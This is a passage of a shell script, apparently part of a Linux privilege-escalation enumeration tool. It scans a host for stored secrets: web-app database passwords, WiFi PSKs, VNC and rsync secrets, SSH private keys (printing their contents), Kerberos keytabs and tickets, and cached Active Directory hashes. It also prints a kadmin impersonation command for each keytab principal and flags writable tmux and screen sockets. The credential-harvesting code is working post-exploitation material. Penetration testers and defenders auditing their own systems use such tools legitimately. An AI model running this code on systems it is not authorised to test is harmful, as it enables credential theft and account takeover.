    if ! [ "`echo \"$PSTORAGE_DRUPAL\" | grep -E \"settings\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "settings.php"; fi; fi; printf "%s" "$PSTORAGE_DRUPAL" | grep -E "settings\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,settings\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix'" | sed -${E} "s,drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix',${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_MOODLE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Moodle Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MOODLE\" | grep -E \"config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "config.php"; fi; fi; printf "%s" "$PSTORAGE_MOODLE" | grep -E "config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "dbtype|dbhost|dbuser|dbhost|dbpass|dbport" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SUPERVISORD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Supervisord Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SUPERVISORD\" | grep -E \"supervisord\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "supervisord.conf"; fi; fi; printf "%s" "$PSTORAGE_SUPERVISORD" | grep -E "supervisord\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,supervisord\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "port.*=|username.*=|password.*=" | sed -${E} "s,port.*=|username.*=|password.*=,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_CESI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cesi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CESI\" | grep -E \"cesi\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cesi.conf"; fi; fi; printf "%s" "$PSTORAGE_CESI" | grep -E "cesi\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cesi\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username.*=|password.*=|host.*=|port.*=|database.*=" | sed -${E} "s,username.*=|password.*=|host.*=|port.*=|database.*=,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_RSYNC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Rsync Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.conf"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,secrets.*|auth.*users.*=,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.secrets"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HOSTAPD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Hostapd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HOSTAPD\" | grep -E \"hostapd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hostapd.conf"; fi; fi; printf "%s" "$PSTORAGE_HOSTAPD" | grep -E "hostapd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hostapd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,passphrase.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_WIFI_CONNECTIONS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wifi Connections Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WIFI_CONNECTIONS\" | grep -E \"system-connections$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system-connections"; fi; fi; printf "%s" "$PSTORAGE_WIFI_CONNECTIONS" | grep -E "system-connections$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system-connections$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "psk.*" | sed -${E} "s,psk.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_ANACONDA_KS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Anaconda ks Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ANACONDA_KS\" | grep -E \"anaconda-ks\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "anaconda-ks.cfg"; fi; fi; printf "%s" "$PSTORAGE_ANACONDA_KS" | grep -E "anaconda-ks\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,anaconda-ks\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rootpw.*" | sed -${E} "s,rootpw.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_VNC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing VNC Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"\.vnc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".vnc"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "\.vnc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vnc$,${SED_RED},"; find "$f" -name "passwd" | while read ff; do ls -ld "$ff" | sed -${E} "s,passwd,${SED_RED},"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.c.*nf.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.c*nf*"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.c.*nf.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.c.*nf.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.ini"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.txt"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.xml"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_OPENVPN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing OpenVPN Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OPENVPN\" | grep -E \"\.ovpn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ovpn"; fi; fi; printf "%s" "$PSTORAGE_OPENVPN" | grep -E "\.ovpn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ovpn$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "auth-user-pass.+" | sed -${E} "s,auth-user-pass.+,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_LDAP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ldap Files (limit 70)"
    echo "The password hash is from the {SSHA} to 'structural'"
    if ! [ "`echo \"$PSTORAGE_LDAP\" | grep -E \"ldap$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ldap"; fi; fi; printf "%s" "$PSTORAGE_LDAP" | grep -E "ldap$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ldap$,${SED_RED},"; find "$f" -name "*.bdb" | while read ff; do ls -ld "$ff" | sed -${E} "s,.bdb,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E -i -a -o "description.*" | sort | uniq | sed -${E} "s,administrator|password|ADMINISTRATOR|PASSWORD|Password|Administrator,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_LOG4SHELL" ] || [ "$DEBUG" ]; then
  print_2title "Searching Log4Shell vulnerable libraries"
  printf "%s\n" "$PSTORAGE_LOG4SHELL" | while read f; do
    echo "$f" | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])" | sed -${E} "s,log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6]),${SED_RED},";
  done
  echo ""
fi

print_2title "Searching ssl/ssh files"
if [ "$PSTORAGE_CERTSB4" ]; then certsb4_grep=$(grep -L "\"\|'\|(" $PSTORAGE_CERTSB4 2>/dev/null); fi
if ! [ "$SEARCH_IN_FOLDER" ]; then
  sshconfig="$(ls /etc/ssh/ssh_config 2>/dev/null)"
  hostsdenied="$(ls /etc/hosts.denied 2>/dev/null)"
  hostsallow="$(ls /etc/hosts.allow 2>/dev/null)"
  writable_agents=$(find /tmp /etc /home -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
else
  sshconfig="$(ls ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null)"
  hostsdenied="$(ls ${ROOT_FOLDER}etc/hosts.denied 2>/dev/null)"
  hostsallow="$(ls ${ROOT_FOLDER}etc/hosts.allow 2>/dev/null)"
  writable_agents=$(find  ${ROOT_FOLDER} -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
fi

if [ "$PSTORAGE_SSH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SSH Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_dsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_dsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_dsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_dsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_rsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_rsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_rsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_rsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"known_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "known_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "known_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,known_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_keys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_keys"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_keys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_keys$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,from=[\w\._\-]+,${SED_GOOD},g"; done; echo "";
fi


grep "PermitRootLogin \|ChallengeResponseAuthentication \|PasswordAuthentication \|UsePAM \|Port\|PermitEmptyPasswords\|PubkeyAuthentication\|ListenAddress\|ForwardAgent\|AllowAgentForwarding\|AuthorizedKeysFiles" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | sed -${E} "s,PermitRootLogin.*es|PermitEmptyPasswords.*es|ChallengeResponseAuthentication.*es|FordwardAgent.*es,${SED_RED},"

if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$TIMEOUT" ]; then
    privatekeyfilesetc=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null)
    privatekeyfileshome=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOMESEARCH 2>/dev/null)
    privatekeyfilesroot=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /root 2>/dev/null)
    privatekeyfilesmnt=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /mnt 2>/dev/null)
  else
    privatekeyfilesetc=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null) 
    privatekeyfileshome=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOME/.ssh 2>/dev/null)
  fi
else
  privatekeyfilesetc=$(timeout 120 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' "$ROOT_FOLDER" 2>/dev/null)
fi

if [ "$privatekeyfilesetc" ] || [ "$privatekeyfileshome" ] || [ "$privatekeyfilesroot" ] || [ "$privatekeyfilesmnt" ] ; then
  echo ""
  print_3title "Possible private SSH keys were found!" | sed -${E} "s,private SSH keys,${SED_RED},"
  if [ "$privatekeyfilesetc" ]; then printf "$privatekeyfilesetc\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfileshome" ]; then printf "$privatekeyfileshome\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfilesroot" ]; then printf "$privatekeyfilesroot\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfilesmnt" ]; then printf "$privatekeyfilesmnt\n" | sed -${E} "s,.*,${SED_RED},"; fi
  echo ""
fi
if [ "$certsb4_grep" ] || [ "$PSTORAGE_CERTSBIN" ]; then
  print_3title "Some certificates were found (out limited):"
  printf "$certsb4_grep\n" | head -n 20
  printf "$$PSTORAGE_CERTSBIN\n" | head -n 20
    echo ""
fi
if [ "$PSTORAGE_CERTSCLIENT" ]; then
  print_3title "Some client certificates were found:"
  printf "$PSTORAGE_CERTSCLIENT\n"
  echo ""
fi
if [ "$PSTORAGE_SSH_AGENTS" ]; then
  print_3title "Some SSH Agent files were found:"
  printf "$PSTORAGE_SSH_AGENTS\n"
  echo ""
fi
if ssh-add -l 2>/dev/null | grep -qv 'no identities'; then
  print_3title "Listing SSH Agents"
  ssh-add -l
  echo ""
fi
if gpg-connect-agent "keyinfo --list" /bye 2>/dev/null | grep "D - - 1"; then
  print_3title "Listing gpg keys cached in gpg-agent"
  gpg-connect-agent "keyinfo --list" /bye
  echo ""
fi
if [ "$writable_agents" ]; then
  print_3title "Writable ssh and gpg agents"
  printf "%s\n" "$writable_agents"
fi
if [ "$PSTORAGE_SSH_CONFIG" ]; then
  print_3title "Some home ssh config file was found"
  printf "%s\n" "$PSTORAGE_SSH_CONFIG" | while read f; do ls "$f" | sed -${E} "s,$f,${SED_RED},"; cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,User|ProxyCommand,${SED_RED},"; done
  echo ""
fi
if [ "$hostsdenied" ]; then
  print_3title "/etc/hosts.denied file found, read the rules:"
  printf "$hostsdenied\n"
  cat " ${ROOT_FOLDER}etc/hosts.denied" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_GREEN},"
  echo ""
fi
if [ "$hostsallow" ]; then
  print_3title "/etc/hosts.allow file found, trying to read the rules:"
  printf "$hostsallow\n"
  cat " ${ROOT_FOLDER}etc/hosts.allow" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_RED},"
  echo ""
fi
if [ "$sshconfig" ]; then
  echo ""
  echo "Searching inside /etc/ssh/ssh_config for interesting info"
  grep -v "^#"  ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed -${E} "s,Host|ForwardAgent|User|ProxyCommand,${SED_RED},"
fi
echo ""

if [ "$PSTORAGE_PAM_AUTH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PAM Auth Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PAM_AUTH\" | grep -E \"pam\.d$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pam.d"; fi; fi; printf "%s" "$PSTORAGE_PAM_AUTH" | grep -E "pam\.d$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pam\.d$,${SED_RED},"; find "$f" -name "sshd" | while read ff; do ls -ld "$ff" | sed -${E} "s,sshd,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E -i "auth" | grep -Ev "^#|^@" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi

pamdpass=$(grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#")
if [ "$pamdpass" ] || [ "$DEBUG" ]; then
  print_2title "Passwords inside pam.d"
  grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#" | sed "s,passwd,${SED_RED},"
  echo ""
fi

if [ "$PSTORAGE_NFS_EXPORTS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing NFS Exports Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_NFS_EXPORTS\" | grep -E \"exports$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "exports"; fi; fi; printf "%s" "$PSTORAGE_NFS_EXPORTS" | grep -E "exports$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,exports$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,insecure,${SED_RED},g" | sed -${E} "s,no_root_squash|no_all_squash,${SED_RED_YELLOW},g"; done; echo "";
fi

kadmin_exists="$(command -v kadmin)"
klist_exists="$(command -v klist)"
if [ "$kadmin_exists" ] || [ "$klist_exists" ] || [ "$PSTORAGE_KERBEROS" ] || [ "$DEBUG" ]; then
  print_2title "Searching kerberos conf files and tickets"
  print_info "Gremlins"

  if [ "$kadmin_exists" ]; then echo "kadmin was found on $kadmin_exists" | sed "s,$kadmin_exists,${SED_RED},"; fi
  if [ "$klist_exists" ] && [ -x "$klist_exists" ]; then echo "klist execution"; klist; fi
  ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
  if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "ptrace protection is disabled (0), you might find tickets inside processes memory" | sed "s,is disabled,${SED_RED},g";
  else echo "ptrace protection is enabled ($ptrace_scope), you need to disable it to search for tickets inside processes memory" | sed "s,is enabled,${SED_GREEN},g";
  fi

  printf "%s\n" "$PSTORAGE_KERBEROS" | while read f; do
    if [ -r "$f" ]; then
      if echo "$f" | grep -q .k5login; then
        echo ".k5login file (users with access to the user who has this file in his home)"
        cat "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
      elif echo "$f" | grep -q keytab; then
        echo ""
        echo "keytab file found, you may be able to impersonate some kerberos principals and add users or modify passwords"
        klist -k "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
        printf "$(klist -k $f 2>/dev/null)\n" | awk '{print $2}' | while read l; do
          if [ "$l" ] && echo "$l" | grep -q "@"; then
            printf "$ITALIC  --- Impersonation command: ${NC}kadmin -k -t /etc/krb5.keytab -p \"$l\"\n" | sed -${E} "s,$l,${SED_RED},g"
           
          fi
        done
      elif echo "$f" | grep -q krb5.conf; then
        ls -l "$f"
        cat "$f" 2>/dev/null | sed -${E} "s,default_ccache_name,${SED_RED},";
      elif echo "$f" | grep -q kadm5.acl; then
        ls -l "$f" 
        cat "$f" 2>/dev/null
      elif echo "$f" | grep -q sssd.conf; then
        ls -l "$f"
        cat "$f" 2>/dev/null | sed -${E} "s,cache_credentials ?= ?[tT][rR][uU][eE],${SED_RED},";
      elif echo "$f" | grep -q secrets.ldb; then
        echo "You could use SSSDKCMExtractor to extract the tickets stored here" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
        ls -l "$f"
      elif echo "$f" | grep -q .secrets.mkey; then
        echo "This is the secrets file to use with SSSDKCMExtractor" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
        ls -l "$f"
      fi
    fi
  done
  ls -l "/tmp/krb5cc*" "/var/lib/sss/db/ccache_*" "/etc/opt/quest/vas/host.keytab" 2>/dev/null || echo_not_found "tickets kerberos"
  klist 2>/dev/null || echo_not_found "klist"
  echo ""

fi

if [ "$PSTORAGE_KNOCKD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Knockd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KNOCKD\" | grep -E \"knockd.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*knockd*"; fi; fi; printf "%s" "$PSTORAGE_KNOCKD" | grep -E "knockd.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,knockd.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_KIBANA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Kibana Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KIBANA\" | grep -E \"kibana\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kibana.y*ml"; fi; fi; printf "%s" "$PSTORAGE_KIBANA" | grep -E "kibana\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kibana\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#|^[[:space:]]*$" | sed -${E} "s,username|password|host|port|elasticsearch|ssl,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ELASTICSEARCH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Elasticsearch Files (limit 70)"
    echo "The version is $(curl -X GET '127.0.0.1:9200' 2>/dev/null | grep number | cut -d ':' -f 2)"
    if ! [ "`echo \"$PSTORAGE_ELASTICSEARCH\" | grep -E \"elasticsearch\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "elasticsearch.y*ml"; fi; fi; printf "%s" "$PSTORAGE_ELASTICSEARCH" | grep -E "elasticsearch\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,elasticsearch\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "path.data|path.logs|cluster.name|node.name|network.host|discovery.zen.ping.unicast.hosts" | grep -Ev "\W+\#|^#"; done; echo "";
fi

if [ "$PSTORAGE_LOGSTASH" ] || [ "$DEBUG" ]; then
  print_2title "Searching logstash files"
  printf "$PSTORAGE_LOGSTASH"
  printf "%s\n" "$PSTORAGE_LOGSTASH" | while read d; do
    if [ -r "$d/startup.options" ]; then
      echo "Logstash is running as user:"
      cat "$d/startup.options" 2>/dev/null | grep "LS_USER\|LS_GROUP" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed -${E} "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,root,${SED_RED},"
    fi
    cat "$d/conf.d/out*" | grep "exec\s*{\|command\s*=>" | sed -${E} "s,exec\W*\{|command\W*=>,${SED_RED},"
    cat "$d/conf.d/filt*" | grep "path\s*=>\|code\s*=>\|ruby\s*{" | sed -${E} "s,path\W*=>|code\W*=>|ruby\W*\{,${SED_RED},"
  done
fi
echo ""

if [ "$PSTORAGE_VAULT_SSH_HELPER" ] || [ "$DEBUG" ]; then
  print_2title "Searching Vault-ssh files"
  printf "$PSTORAGE_VAULT_SSH_HELPER\n"
  printf "%s\n" "$PSTORAGE_VAULT_SSH_HELPER" | while read f; do cat "$f" 2>/dev/null; vault-ssh-helper -verify-only -config "$f" 2>/dev/null; done
  echo ""
  vault secrets list 2>/dev/null
  printf "%s\n" "$PSTORAGE_VAULT_SSH_TOKEN" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
fi
echo ""

adhashes=$(ls "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null)
if [ "$adhashes" ] || [ "$DEBUG" ]; then
  print_2title "Searching AD cached hashes"
  ls -l "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null
  echo ""
fi

if ([ "$screensess" ] || [ "$screensess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching screen sessions"
  print_info "CINEMA"
  screensess=$(screen -ls 2>/dev/null)
  screensess2=$(find /run/screen -type d -path "/run/screen/S-*" 2>/dev/null)
  
  screen -v
  printf "$screensess\n$screensess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,No Sockets found.*,${C}[32m&${C}[0m,"
  
  find /run/screen -type s -path "/run/screen/S-*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
    echo "Other user screen socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  done
  echo ""
fi

tmuxdefsess=$(tmux ls 2>/dev/null)
tmuxnondefsess=$(ps auxwww | grep "tmux " | grep -v grep)
tmuxsess2=$(find /tmp -type d -path "/tmp/tmux-*" 2>/dev/null)
if ([ "$tmuxdefsess" ] || [ "$tmuxnondefsess" ] || [ "$tmuxsess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching tmux sessions"$N
  print_info "muxxy ;)"
  tmux -V
  printf "$tmuxdefsess\n$tmuxnondefsess\n$tmuxsess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,no server running on.*,${C}[32m&${C}[0m,"

  find /tmp -type s -path "/tmp/tmux*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
    echo "Other user tmux socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  done
  echo ""
fi

if [ "$PSTORAGE_COUCHDB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing CouchDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_COUCHDB\" | grep -E \"couchdb$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "couchdb"; fi; fi; printf "%s" "$PSTORAGE_COUCHDB" | grep -E "couchdb$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,couchdb$,${SED_RED},"; find "$f" -name "local.ini" | while read ff; do ls -ld "$ff" | sed -${E} "s,local.ini,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,admin.*|password.*|cert_file.*|key_file.*|hashed.*|pbkdf2.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_REDIS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Redis Files (limit 70)"
